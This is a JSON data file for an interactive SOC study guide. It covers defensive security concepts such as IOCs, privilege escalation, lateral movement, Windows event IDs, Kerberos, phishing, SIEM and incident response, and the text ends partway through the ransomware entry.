{
  "homeCards": [
    {
      "id": "soc",
      "icon": "soc",
      "title": "SOC Concepts",
      "color": "bg-red-800/80",
      "tag": {
        "name": "CyberSec",
        "color": "bg-red-500/50 text-white"
      },
      "status": "Explore the guide",
      "href": "#/guide/soc"
    },
    {
      "id": "audit",
      "icon": "audit",
      "title": "Auditing",
      "color": "bg-green-800/80",
      "tag": {
        "name": "CyberSec",
        "color": "bg-green-500/50 text-white"
      },
      "status": "Explore the guide",
      "href": "#/guide/audit"
    },
    {
      "id": "react-basics-lab",
      "title": "OSCP",
      "icon": "react-basics-lab",
      "color": "bg-gray-800/80",
      "tag": {
        "name": "oscp+",
        "color": "bg-gray-500/50 text-white"
      },
      "status": "Explore the guide",
      "href": "#/guide/react-basics-lab"
    },
    {
      "id": "red",
      "title": "Redteam",
      "color": "bg-red-800/80",
      "tag": {
        "name": "Redteam",
        "color": "bg-gray-500/50 text-white"
      },
      "status": "Explore the guide",
      "href": "#/guide/red"
    }
  ],
  "guideData": {
    "soc": {
      "title": "SOC Concepts Interactive Guide",
      "topics": [
        {
          "id": "toc",
          "title": "SOC Concepts and Questions",
          "content": [
            {
              "type": "h2",
              "text": "Welcome to the Interactive SOC Guide"
            },
            {
              "type": "p",
              "text": "This guide provides a comprehensive overview of key concepts and questions related to Security Operations Centers (SOC). Use the navigation on the left to explore different topics. The content is sourced from a detailed cybersecurity document."
            },
            {
              "type": "colored_p",
              "parts": [
                "Topics cover a wide range from fundamental ideas like ",
                {
                  "text": "IOC vs. IOA",
                  "color": "blue"
                },
                " to practical ",
                {
                  "text": "incident response scenarios",
                  "color": "red"
                },
                " for various attack types."
              ]
            },
            {
              "type": "highlight",
              "color": "blue",
              "text": "This is an interactive guide. Click on any topic in the sidebar to begin exploring the world of cybersecurity operations!"
            }
          ]
        },
        {
          "id": "ioc-and-ioa",
          "title": "IOC and IOA",
          "content": [
            {
              "type": "h2",
              "text": "Indicators of Compromise (IOC) vs. Indicators of Attack (IOA)"
            },
            {
              "type": "p",
              "text": "These are critical concepts used to detect, understand, and respond to security incidents."
            },
            {
              "type": "h3",
              "text": "Indicators of Compromise (IOC)"
            },
            {
              "type": "colored_p",
              "parts": [
                "Definition: IOCs are pieces of ",
                {
                  "text": "forensic data",
                  "color": "yellow"
                },
                " that suggest a ",
                {
                  "text": "potential breach",
                  "color": "red"
                },
                " or ",
                {
                  "text": "malicious activity",
                  "color": "red"
                },
                ". They are artifacts observed on a network or in operating systems that indicate a security incident may have occurred."
              ]
            },
            {
              "type": "h3",
              "text": "Examples:"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    {
                      "text": "Unusual network traffic",
                      "color": "purple"
                    }
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Malicious code signatures",
                      "color": "red"
                    }
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "IP addresses, URLs, or domain names associated with known threats",
                      "color": "yellow"
                    }
                  ]
                }
              ]
            },
            {
              "type": "h3",
              "text": "Usage:"
            },
            {
              "type": "colored_p",
              "parts": [
                "IOCs help in detecting ",
                {
                  "text": "past and ongoing intrusions.",
                  "color": "red"
                },
                " They are typically used in ",
                {
                  "text": "reactive security measures,",
                  "color": "yellow"
                },
                " such as after a breach has been detected."
              ]
            },
            {
              "type": "h3",
              "text": "Indicators of Attack (IOA)"
            },
            {
              "type": "colored_p",
              "parts": [
                "Definition: IOAs focus on detecting the ",
                {
                  "text": "intent and methods",
                  "color": "purple"
                },
                " used by attackers to achieve their objectives. Unlike IOCs, which are often specific and static, IOAs are more about understanding the ",
                {
                  "text": "behavior and tactics",
                  "color": "purple"
                },
                " of the attacker."
              ]
            },
            {
              "type": "h3",
              "text": "Examples:"
            },
            {
              "type": "ul",
              "items": [
                "Patterns of behavior that indicate an attacker is attempting to compromise a system",
                {
                  "parts": [
                    "Unusual activity that aligns with known attack techniques (e.g., ",
                    {
                      "text": "lateral movement",
                      "color": "purple"
                    },
                    ")"
                  ]
                },
                "Sequence of actions that deviate from normal usage patterns",
                {
                  "parts": [
                    "Use of legitimate tools in unusual ways (e.g., ",
                    {
                      "text": "PowerShell",
                      "color": "blue"
                    },
                    " used to download malware)"
                  ]
                }
              ]
            },
            {
              "type": "h3",
              "text": "Usage:"
            },
            {
              "type": "colored_p",
              "parts": [
                "IOAs are used to identify and ",
                {
                  "text": "prevent potential attacks before they cause damage.",
                  "color": "green"
                },
                " They are ",
                {
                  "text": "proactive",
                  "color": "green"
                },
                " and help in understanding and mitigating the attacker's strategy and techniques."
              ]
            },
            {
              "type": "h3",
              "text": "Comparison"
            },
            {
              "type": "ul",
              "items": [
                {
                  "text": "Focus:",
                  "subItems": [
                    "IOCs are evidence of an incident.",
                    "IOAs are indicators of potential malicious activity based on behavior."
                  ]
                },
                {
                  "text": "Timeframe:",
                  "subItems": [
                    "IOCs are often used in post-incident analysis.",
                    "IOAs are used for real-time or near-real-time detection and prevention."
                  ]
                },
                {
                  "text": "Nature:",
                  "subItems": [
                    "IOCs are often static and specific.",
                    "IOAs are dynamic and behavior-based."
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "threat-intelligence",
          "title": "Threat Intelligence",
          "content": [
            {
              "type": "h2",
              "text": "Threat Intelligence"
            },
            {
              "type": "colored_p",
              "parts": [
                "Threat intelligence is the practice of ",
                {
                  "text": "gathering, analyzing, and utilizing information",
                  "color": "green"
                },
                " about potential or current threats to an organization's security."
              ]
            },
            {
              "type": "colored_p",
              "parts": [
                "It provides ",
                {
                  "text": "context and actionable insights",
                  "color": "purple"
                },
                " that help organizations understand, anticipate, and defend against cyber threats."
              ]
            },
            {
              "type": "h3",
              "text": "Key Aspects of Threat Intelligence"
            },
            {
              "type": "ol",
              "items": [
                {
                  "text": "Data Collection:",
                  "subItems": [
                    {
                      "parts": [
                        "Sources: Data can be collected from various sources, including ",
                        {
                          "text": "open-source intelligence (OSINT)",
                          "color": "blue"
                        },
                        ", ",
                        {
                          "text": "dark web monitoring",
                          "color": "purple"
                        },
                        ", internal logs, network traffic, and commercial threat intelligence feeds."
                      ]
                    },
                    {
                      "parts": [
                        "Types of Data: This includes ",
                        {
                          "text": "IOCs,",
                          "color": "yellow"
                        },
                        " IP addresses, URLs, malware hashes, and details about threat actors and their ",
                        {
                          "text": "tactics, techniques, and procedures (TTPs).",
                          "color": "red"
                        }
                      ]
                    }
                  ]
                },
                {
                  "text": "Analysis:",
                  "subItems": [
                    "Correlation and Context: Analyzing the collected data to find correlations, patterns, and context.",
                    "TTPs: Understanding the tactics, techniques, and procedures of threat actors to predict and mitigate future attacks."
                  ]
                },
                {
                  "text": "Utilization:",
                  "subItems": [
                    "Proactive Defense: Using threat intelligence to anticipate and prevent potential threats by strengthening defenses.",
                    "Incident Response: Leveraging threat intelligence during and after an incident to understand the attack, identify attackers, and take appropriate remediation steps."
                  ]
                }
              ]
            },
            {
              "type": "h3",
              "text": "Benefits of Threat Intelligence"
            },
            {
              "type": "ul",
              "items": [
                "Faster Response",
                "Risk Mitigation",
                "Enhanced Detection and Prevention",
                "Informed Decision-Making"
              ]
            },
            {
              "type": "h3",
              "text": "Well-known Threat Intelligence sources:"
            },
            {
              "type": "ul",
              "items": [
                "IBM X-Force Exchange",
                "Cisco Talos Intelligence",
                "AbuseIPDB",
                "Virustotal"
              ]
            }
          ]
        },
        {
          "id": "system-hardening",
          "title": "System Hardening",
          "content": [
            {
              "type": "h2",
              "text": "System Hardening"
            },
            {
              "type": "colored_p",
              "parts": [
                "System hardening is the process of securing a computer system by ",
                {
                  "text": "reducing its surface of vulnerability.",
                  "color": "yellow"
                }
              ]
            },
            {
              "type": "colored_p",
              "parts": [
                "This involves configuring the system to ",
                {
                  "text": "minimize potential attack vectors,",
                  "color": "red"
                },
                " removing unnecessary services and software, and applying security measures to protect against threats."
              ]
            },
            {
              "type": "h3",
              "text": "Steps in System Hardening"
            },
            {
              "type": "ol",
              "items": [
                {
                  "text": "Remove Unnecessary Services and Software:",
                  "subItems": [
                    "Disable Unneeded Services.",
                    "Uninstall Unnecessary Software."
                  ]
                },
                {
                  "text": "Apply Security Patches and Updates:",
                  "subItems": [
                    "Regular Updates.",
                    "Automated Updates."
                  ]
                },
                {
                  "text": "User Accounts and Authentication:",
                  "subItems": [
                    "Strong Password Policies.",
                    "Limit Administrative Privileges.",
                    {
                      "parts": [
                        {
                          "text": "Multi-Factor Authentication (MFA).",
                          "color": "green"
                        }
                      ]
                    }
                  ]
                },
                {
                  "text": "Network Security Measures:",
                  "subItems": [
                    {
                      "parts": [
                        {
                          "text": "Firewalls:",
                          "color": "blue"
                        },
                        " Configure firewalls to control incoming and outgoing traffic."
                      ]
                    },
                    {
                      "parts": [
                        {
                          "text": "Intrusion Detection and Prevention Systems (IDPS):",
                          "color": "blue"
                        },
                        " Deploy IDPS to monitor network traffic for suspicious activity."
                      ]
                    }
                  ]
                },
                {
                  "text": "Implement Logging and Monitoring:",
                  "subItems": [
                    "System Logs.",
                    "Monitoring Tools."
                  ]
                },
                {
                  "text": "Data Protection:",
                  "subItems": [
                    "Encryption.",
                    "Backup."
                  ]
                }
              ]
            },
            {
              "type": "h3",
              "text": "Benefits of System Hardening"
            },
            {
              "type": "ul",
              "items": [
                "Reduced Attack Surface: By minimizing potential entry points, it becomes more difficult for attackers to exploit vulnerabilities.",
                "Performance: Removing unnecessary services and software can improve system performance and stability.",
                "Improved Security Posture."
              ]
            }
          ]
        },
        {
          "id": "privilege-escalation",
          "title": "Privilege Escalation",
          "content": [
            {
              "type": "h2",
              "text": "Privilege Escalation"
            },
            {
              "type": "colored_p",
              "parts": [
                "A crucial step in many cyber-attacks, allowing an attacker to move from a ",
                {
                  "text": "lower-privileged account",
                  "color": "yellow"
                },
                " to a ",
                {
                  "text": "higher-privileged account",
                  "color": "red"
                },
                " (e.g., administrator or root)."
              ]
            },
            {
              "type": "h3",
              "text": "Types of Privilege Escalation"
            },
            {
              "type": "ul",
              "items": [
                {
                  "text": "Vertical Privilege Escalation:",
                  "subItems": [
                    {
                      "parts": [
                        "An attacker gains ",
                        {
                          "text": "higher-level privileges.",
                          "color": "red"
                        },
                        " E.g., a normal user gaining administrative rights."
                      ]
                    }
                  ]
                },
                {
                  "text": "Horizontal Privilege Escalation:",
                  "subItems": [
                    {
                      "parts": [
                        "An attacker accesses resources of other users with ",
                        {
                          "text": "similar privileges.",
                          "color": "purple"
                        },
                        " E.g., accessing another user’s data."
                      ]
                    }
                  ]
                }
              ]
            },
            {
              "type": "h3",
              "text": "Common Methods"
            },
            {
              "type": "ol",
              "items": [
                {
                  "text": "Exploiting Software Vulnerabilities:",
                  "subItems": [
                    "Buffer Overflow",
                    "Zero-day Exploits"
                  ]
                },
                {
                  "text": "Misconfigurations:",
                  "subItems": [
                    "Insecure Permissions"
                  ]
                },
                {
                  "text": "Credential Theft:",
                  "subItems": [
                    "Keylogging",
                    "Pass-the-Hash"
                  ]
                },
                {
                  "text": "Social Engineering:",
                  "subItems": [
                    "Phishing"
                  ]
                },
                {
                  "text": "Malicious Software:",
                  "subItems": [
                    "Trojan Horses and Rootkits"
                  ]
                }
              ]
            },
            {
              "type": "h3",
              "text": "Preventive Measures"
            },
            {
              "type": "ul",
              "items": [
                "Patch Management",
                "Principle of Least Privilege",
                "Strong Authentication: Multi-Factor Authentication (MFA) and Secure Credential Storage"
              ]
            }
          ]
        },
        {
          "id": "persistence",
          "title": "Persistence",
          "content": [
            {
              "type": "h2",
              "text": "Persistence"
            },
            {
              "type": "colored_p",
              "parts": [
                "Persistence refers to the techniques used by attackers to ",
                {
                  "text": "maintain their foothold",
                  "color": "red"
                },
                " on a compromised system, even after restarts, user logouts, or other attempts to disrupt their access."
              ]
            },
            {
              "type": "h3",
              "text": "Methods of Persistence"
            },
            {
              "type": "ol",
              "items": [
                {
                  "text": "AutoStart Entries:",
                  "subItems": [
                    {
                      "parts": [
                        {
                          "text": "Registry Keys (Windows):",
                          "color": "blue"
                        },
                        " Modifying registry keys to launch malicious programs at startup."
                      ]
                    },
                    {
                      "parts": [
                        {
                          "text": "Startup Folders (Windows):",
                          "color": "blue"
                        },
                        " Placing malicious shortcuts in startup folders."
                      ]
                    }
                  ]
                },
                {
                  "text": "Scheduled Tasks:",
                  "subItems": [
                    {
                      "parts": [
                        {
                          "text": "Task Scheduler (Windows):",
                          "color": "blue"
                        },
                        " Creating tasks to execute malicious payloads."
                      ]
                    }
                  ]
                },
                {
                  "text": "Rootkits:",
                  "subItems": [
                    "Installing rootkits to hide malicious software and provide ongoing access."
                  ]
                },
                {
                  "text": "User and System Accounts:",
                  "subItems": [
                    "Backdoor Accounts",
                    "Credential Theft"
                  ]
                },
                {
                  "text": "DLL Injection and Hijacking:",
                  "subItems": [
                    "DLL Injection",
                    "DLL Hijacking"
                  ]
                },
                {
                  "text": "Network-based Persistence:",
                  "subItems": [
                    {
                      "parts": [
                        {
                          "text": "Remote Access Trojans (RATs):",
                          "color": "red"
                        },
                        " Using RATs to maintain remote control."
                      ]
                    },
                    {
                      "parts": [
                        {
                          "text": "Command and Control (C2) Channels:",
                          "color": "purple"
                        },
                        " Establishing covert communication channels."
                      ]
                    }
                  ]
                }
              ]
            },
            {
              "type": "colored_p",
              "parts": [
                "Understanding and detecting persistence mechanisms is ",
                {
                  "text": "essential for effective incident response",
                  "color": "green"
                },
                " and system hardening efforts."
              ]
            }
          ]
        },
        {
          "id": "lateral-movement",
          "title": "Lateral Movement",
          "content": [
            {
              "type": "h2",
              "text": "Lateral Movement"
            },
            {
              "type": "colored_p",
              "parts": [
                "Techniques used by attackers to ",
                {
                  "text": "move within a network",
                  "color": "purple"
                },
                " after initially compromising a system. This allows them to gain access to additional systems and data."
              ]
            },
            {
              "type": "colored_p",
              "parts": [
                "Lateral movement is a critical phase in many ",
                {
                  "text": "advanced persistent threats (APTs)",
                  "color": "red"
                },
                " and can be difficult to detect because it often involves using ",
                {
                  "text": "legitimate credentials and tools.",
                  "color": "yellow"
                }
              ]
            },
            {
              "type": "h3",
              "text": "Techniques for Lateral Movement"
            },
            {
              "type": "ol",
              "items": [
                {
                  "text": "Credential Dumping:",
                  "subItems": [
                    {
                      "parts": [
                        "Extracting credentials using tools like ",
                        {
                          "text": "Mimikatz",
                          "color": "red"
                        },
                        " and ",
                        {
                          "text": "WCE.",
                          "color": "red"
                        }
                      ]
                    }
                  ]
                },
                {
                  "text": "Pass-the-Hash:",
                  "subItems": [
                    "Using hashed credentials to authenticate without needing to decrypt them."
                  ]
                },
                {
                  "text": "Pass-the-Ticket:",
                  "subItems": [
                    "Using Kerberos tickets to authenticate."
                  ]
                },
                {
                  "text": "Remote Execution:",
                  "subItems": [
                    {
                      "parts": [
                        "Using tools like ",
                        {
                          "text": "PsExec, WMI, RDP,",
                          "color": "blue"
                        },
                        " and ",
                        {
                          "text": "SSH",
                          "color": "blue"
                        },
                        " to execute commands remotely."
                      ]
                    }
                  ]
                },
                "Service Creation: Creating or modifying services on remote systems."
              ]
            },
            {
              "type": "h3",
              "text": "Detecting and Preventing Lateral Movement"
            },
            {
              "type": "ol",
              "items": [
                "Network Segmentation",
                "Least Privilege Principle",
                "Monitoring and Logging",
                "Multi-Factor Authentication (MFA)",
                "Behavioral Analysis",
                {
                  "parts": [
                    {
                      "text": "Endpoint Detection and Response (EDR)",
                      "color": "green"
                    }
                  ]
                },
                "Patch Management",
                "Regular Audits and Penetration Testing"
              ]
            }
          ]
        },
        {
          "id": "incident-response",
          "title": "SANS Incident Response Steps",
          "content": [
            {
              "type": "h2",
              "text": "SANS Incident Response Steps"
            },
            {
              "type": "ol",
              "items": [
                {
                  "text": "Preparation",
                  "subItems": [
                    "Establish Policies and Procedures",
                    "Form Incident Response Team",
                    "Tools and Resources",
                    "Training and Awareness"
                  ]
                },
                {
                  "text": "Identification",
                  "subItems": [
                    "Incident Notification",
                    "Initial Triage"
                  ]
                },
                {
                  "text": "Containment",
                  "subItems": [
                    "Contain the Incident",
                    "Isolation"
                  ]
                },
                {
                  "text": "Eradication",
                  "subItems": [
                    "Root Cause Analysis",
                    "Remediation"
                  ]
                },
                {
                  "text": "Recovery",
                  "subItems": [
                    "Data Restoration",
                    "System Validation"
                  ]
                },
                {
                  "text": "Lessons Learned",
                  "subItems": [
                    "Post-Incident Review",
                    "Documentation",
                    "Continuous Improvement"
                  ]
                }
              ]
            },
            {
              "type": "h3",
              "text": "Reporting and Communication"
            },
            {
              "type": "ul",
              "items": [
                "Internal Reporting.",
                "External Reporting."
              ]
            }
          ]
        },
        {
          "id": "log-types",
          "title": "Type of Logs",
          "content": [
            {
              "type": "h2",
              "text": "Type of Logs"
            },
            {
              "type": "ul",
              "items": [
                {
                  "text": "System Logs:",
                  "subItems": [
                    "Record events related to the OS, such as boot events, shutdowns, crashes, and updates."
                  ]
                },
                {
                  "text": "Application Logs:",
                  "subItems": [
                    "Capture events related to applications. E.g., web servers, database servers."
                  ]
                },
                {
                  "text": "Security Logs:",
                  "subItems": [
                    {
                      "parts": [
                        "Record security-related events like authentication attempts, policy changes. E.g., ",
                        {
                          "text": "Firewall logs, IDS/IPS logs, antivirus logs.",
                          "color": "green"
                        }
                      ]
                    }
                  ]
                },
                {
                  "text": "Network Logs:",
                  "subItems": [
                    {
                      "parts": [
                        "Capture data about network traffic. E.g., router logs, VPN logs, ",
                        {
                          "text": "NetFlow, sFlow.",
                          "color": "blue"
                        }
                      ]
                    }
                  ]
                },
                {
                  "text": "Web Server Logs:",
                  "subItems": [
                    "Record HTTP requests and responses. E.g., access logs, error logs."
                  ]
                },
                {
                  "text": "Database Logs:",
                  "subItems": [
                    "Capture events related to database operations. E.g., SQL query logs, transaction logs."
                  ]
                },
                {
                  "text": "Email Logs:",
                  "subItems": [
                    {
                      "parts": [
                        "Record email transactions. E.g., ",
                        {
                          "text": "SMTP logs,",
                          "color": "blue"
                        },
                        " mail server logs."
                      ]
                    }
                  ]
                },
                {
                  "text": "Authentication Logs:",
                  "subItems": [
                    {
                      "parts": [
                        "Capture details about authentication attempts. E.g., login attempts, ",
                        {
                          "text": "MFA events.",
                          "color": "green"
                        }
                      ]
                    }
                  ]
                },
                {
                  "text": "Endpoint Logs:",
                  "subItems": [
                    {
                      "parts": [
                        "Record events on endpoint devices. E.g., Antivirus scans, ",
                        {
                          "text": "EDR logs.",
                          "color": "green"
                        }
                      ]
                    }
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "protocol-logs",
          "title": "Protocol Logs",
          "content": [
            {
              "type": "h2",
              "text": "Protocol Logs"
            },
            {
              "type": "h3",
              "text": "1. HTTP/HTTPS Logs"
            },
            {
              "type": "ul",
              "items": [
                "Access Logs",
                "Error Logs"
              ]
            },
            {
              "type": "h3",
              "text": "2. DNS Logs"
            },
            {
              "type": "ul",
              "items": [
                "Query Logs",
                "Response Logs"
              ]
            },
            {
              "type": "h3",
              "text": "3. SMTP Logs"
            },
            {
              "type": "ul",
              "items": [
                "Mail Server Logs"
              ]
            },
            {
              "type": "h3",
              "text": "4. FTP Logs"
            },
            {
              "type": "ul",
              "items": [
                "Transfer Logs"
              ]
            },
            {
              "type": "h3",
              "text": "5. SSH Logs"
            },
            {
              "type": "ul",
              "items": [
                "Authentication Logs",
                "Command Execution Logs"
              ]
            },
            {
              "type": "h3",
              "text": "6. IMAP/POP3 Logs"
            },
            {
              "type": "ul",
              "items": [
                "Connection Logs"
              ]
            },
            {
              "type": "h3",
              "text": "7. Kerberos Logs"
            },
            {
              "type": "ul",
              "items": [
                "Ticket Granting Logs"
              ]
            }
          ]
        },
        {
          "id": "windows-logs",
          "title": "Windows Logs",
          "content": [
            {
              "type": "h2",
              "text": "Windows Logs"
            },
            {
              "type": "p",
              "text": "Providing detailed information about system events, user activities, security incidents, and application behavior."
            },
            {
              "type": "h3",
              "text": "Log Categories"
            },
            {
              "type": "ul",
              "items": [
                "System Logs",
                "Application Logs",
                "Security Logs",
                "Setup Logs"
              ]
            },
            {
              "type": "h2",
              "text": "Common Event IDs"
            },
            {
              "type": "h3",
              "text": "Security Logs"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    {
                      "text": "4624:",
                      "color": "green"
                    },
                    " An account was successfully logged on."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "4625:",
                      "color": "red"
                    },
                    " An account failed to log on."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "4648:",
                      "color": "yellow"
                    },
                    " A logon was attempted using explicit credentials."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "4672:",
                      "color": "blue"
                    },
                    " Special privileges assigned to a new logon."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "4720:",
                      "color": "green"
                    },
                    " A user account was created."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "4723:",
                      "color": "yellow"
                    },
                    " An attempt was made to change an account's password."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "4740:",
                      "color": "red"
                    },
                    " A user account was locked out."
                  ]
                }
              ]
            },
            {
              "type": "h3",
              "text": "System Logs"
            },
            {
              "type": "ul",
              "items": [
                "6005: The event log service was started.",
                "6006: The event log service was stopped.",
                "6008: The previous system shutdown was unexpected.",
                "41: The system has rebooted without cleanly shutting down first (Kernel-Power)."
              ]
            },
            {
              "type": "h3",
              "text": "Account Management Event IDs"
            },
            {
              "type": "ul",
              "items": [
                "4722: User account enabled.",
                "4725: User account disabled.",
                "4726: User account deleted.",
                "4732: Member added to local group.",
                "4733: Member removed from local group."
              ]
            },
            {
              "type": "h3",
              "text": "Process Tracking Events"
            },
            {
              "type": "ul",
              "items": [
                "4688: A new process has been created.",
                "4689: A process has existed."
              ]
            }
          ]
        },
        {
          "id": "kerberos-sam-ntlm",
          "title": "Kerberos, SAM, NTLM",
          "content": [
            {
              "type": "h2",
              "text": "Kerberos"
            },
            {
              "type": "colored_p",
              "parts": [
                "A network authentication protocol for ",
                {
                  "text": "strong authentication",
                  "color": "green"
                },
                " using secret-key cryptography."
              ]
            },
            {
              "type": "h3",
              "text": "Main Components"
            },
            {
              "type": "ul",
              "items": [
                "Authentication Server (AS)",
                "Database",
                "Ticket Granting Server (TGS)"
              ]
            },
            {
              "type": "h3",
              "text": "Common Kerberos Attacks"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    {
                      "text": "Pass-the-Ticket (PtT)",
                      "color": "red"
                    }
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Pass-the-Hash (PtH)",
                      "color": "red"
                    }
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Overpass-the-Hash (Pass-the-Key)",
                      "color": "red"
                    }
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Golden Ticket Attack",
                      "color": "red"
                    }
                  ]
                }
              ]
            },
            {
              "type": "h2",
              "text": "SAM (Security Accounts Manager)"
            },
            {
              "type": "colored_p",
              "parts": [
                "A database file in Windows that stores user account info, including ",
                {
                  "text": "hashed passwords",
                  "color": "yellow"
                },
                " for local users."
              ]
            },
            {
              "type": "ul",
              "items": [
                "Location: `C:\\Windows\\System32\\config`",
                "Function: Authenticates local user logins.",
                {
                  "parts": [
                    "Security: Accessible by processes like ",
                    {
                      "text": "LSASS.",
                      "color": "blue"
                    }
                  ]
                }
              ]
            },
            {
              "type": "h2",
              "text": "NTLM (NT LAN Manager)"
            },
            {
              "type": "colored_p",
              "parts": [
                "A legacy Microsoft authentication protocol. It is a ",
                {
                  "text": "challenge-response",
                  "color": "purple"
                },
                " protocol."
              ]
            },
            {
              "type": "ul",
              "items": [
                "Use Cases: Local logins, workgroup environments, backward compatibility.",
                {
                  "parts": [
                    "Security Concerns: Susceptible to ",
                    {
                      "text": "relay attacks, pass-the-hash attacks,",
                      "color": "red"
                    },
                    " and ",
                    {
                      "text": "brute-force attacks.",
                      "color": "red"
                    },
                    {
                      "text": " Kerberos is preferred.",
                      "color": "green"
                    }
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "phishing",
          "title": "Phishing",
          "content": [
            {
              "type": "h2",
              "text": "Phishing Emails"
            },
            {
              "type": "colored_p",
              "parts": [
                "A type of cyber-attack where attackers ",
                {
                  "text": "disguise themselves as legitimate entities",
                  "color": "purple"
                },
                " to trick individuals into revealing sensitive information."
              ]
            },
            {
              "type": "colored_p",
              "parts": [
                "These emails often contain ",
                {
                  "text": "malicious links or attachments",
                  "color": "red"
                },
                " that can install malware or direct the user to fraudulent websites."
              ]
            },
            {
              "type": "h3",
              "text": "Types of Phishing"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    {
                      "text": "Spear Phishing:",
                      "color": "red"
                    },
                    " Targeted at specific individuals or organizations."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Clone Phishing:",
                      "color": "yellow"
                    },
                    " A copy of a legitimate email with malicious links."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Whaling:",
                      "color": "red"
                    },
                    " Targets high-profile individuals like executives."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Vishing and Smishing:",
                      "color": "purple"
                    },
                    " Phishing using voice calls or SMS text messages."
                  ]
                }
              ]
            },
            {
              "type": "h3",
              "text": "Common Tactics"
            },
            {
              "type": "ul",
              "items": [
                "Urgency and Fear",
                "Spoofed Sender Addresses",
                "Compelling Subject Lines",
                "Malicious Links and Attachments"
              ]
            },
            {
              "type": "h3",
              "text": "Defense Against Phishing"
            },
            {
              "type": "ol",
              "items": [
                "User Education and Training",
                "Email Filtering and Anti-Phishing Tools",
                {
                  "parts": [
                    {
                      "text": "Multi-Factor Authentication (MFA)",
                      "color": "green"
                    }
                  ]
                },
                "Secure Email Gateways",
                {
                  "parts": [
                    "Email Authentication Protocols (",
                    {
                      "text": "SPF, DKIM, DMARC",
                      "color": "blue"
                    },
                    ")"
                  ]
                }
              ]
            },
            {
              "type": "highlight",
              "color": "green",
              "text": "To identify a phishing email, check the sender's address, hover over links, look for grammar mistakes, and be wary of urgent requests."
            }
          ]
        },
        {
          "id": "siem",
          "title": "SIEM Solutions",
          "content": [
            {
              "type": "h2",
              "text": "SIEM Solutions"
            },
            {
              "type": "colored_p",
              "parts": [
                "SIEM stands for ",
                {
                  "text": "Security Information and Event Management.",
                  "color": "green"
                }
              ]
            },
            {
              "type": "colored_p",
              "parts": [
                "A ",
                {
                  "text": "centralized solution",
                  "color": "purple"
                },
                " that analyzes event logs for threat monitoring and incident response."
              ]
            },
            {
              "type": "h3",
              "text": "Key Functions"
            },
            {
              "type": "ol",
              "items": [
                "Data Collection",
                "Normalization and Parsing",
                "Alerting and Monitoring",
                "Incident Detection and Response",
                "Forensic Analysis",
                "Compliance Reporting",
                {
                  "parts": [
                    {
                      "text": "User and Entity Behavior Analytics (UEBA)",
                      "color": "blue"
                    }
                  ]
                }
              ]
            },
            {
              "type": "h3",
              "text": "Benefits"
            },
            {
              "type": "ul",
              "items": [
                "Centralized Visibility",
                "Early Threat Detection",
                "Response Efficiency",
                "Compliance Support"
              ]
            },
            {
              "type": "h3",
              "text": "Challenges"
            },
            {
              "type": "ul",
              "items": [
                "Complexity",
                "Tuning and False Positives",
                "Skill Requirements"
              ]
            }
          ]
        },
        {
          "id": "vulnerabilities",
          "title": "Common Vulnerabilities",
          "content": [
            {
              "type": "h2",
              "text": "Examples of Common Security Vulnerabilities"
            },
            {
              "type": "ol",
              "items": [
                {
                  "parts": [
                    {
                      "text": "Unpatched Software",
                      "color": "yellow"
                    }
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Weak Passwords",
                      "color": "yellow"
                    }
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Lack of Encryption",
                      "color": "yellow"
                    }
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "SQL Injection",
                      "color": "red"
                    }
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Cross-Site Scripting (XSS)",
                      "color": "red"
                    }
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Phishing",
                      "color": "purple"
                    }
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Insider Threats",
                      "color": "purple"
                    }
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Social Engineering",
                      "color": "purple"
                    }
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Remote Work Risks",
                      "color": "yellow"
                    }
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "attack-response",
          "title": "Incident Response for Attacks",
          "content": [
            {
              "type": "h2",
              "text": "Incident Response for Common Attack Types"
            },
            {
              "type": "h3",
              "text": "1. Brute Forcing"
            },
            {
              "type": "ul",
              "items": [
                {
                  "text": "Details:",
                  "subItems": [
                    "Attacker tries to guess a password by attempting many possibilities."
                  ]
                },
                {
                  "text": "Indicators:",
                  "subItems": [
                    "Multiple login failures in a short period."
                  ]
                },
                {
                  "text": "Investigate:",
                  "subItems": [
                    "Active Directory, Application, and OS logs."
                  ]
                },
                {
                  "text": "Actions:",
                  "subItems": [
                    "Disable the account and block the attacker IP."
                  ]
                }
              ]
            },
            {
              "type": "h3",
              "text": "2. Botnets"
            },
            {
              "type": "ul",
              "items": [
                {
                  "text": "Details:",
                  "subItems": [
                    "Victim server is used to perform DDoS attacks or other malicious activities."
                  ]
                },
                {
                  "text": "Indicators:",
                  "subItems": [
                    "Connection to suspicious IPs",
                    "Abnormal high volume of network traffic."
                  ]
                },
                {
                  "text": "Investigate:",
                  "subItems": [
                    "Network traffic, OS logs (new processes)."
                  ]
                },
                {
                  "text": "Actions:",
                  "subItems": [
                    "Isolate the server",
                    "Remove malicious processes",
                    "Patch the vulnerability."
                  ]
                }
              ]
            },
            {
              "type": "h3",
              "text": "3. Ransomware"
            },
            {
              "type": "ul",
              "items": [
                {
                  "text": "Details:",
                  "subItems": [
                    "Malware that encrypts files and requests a ransom."
                  ]
                },
                {
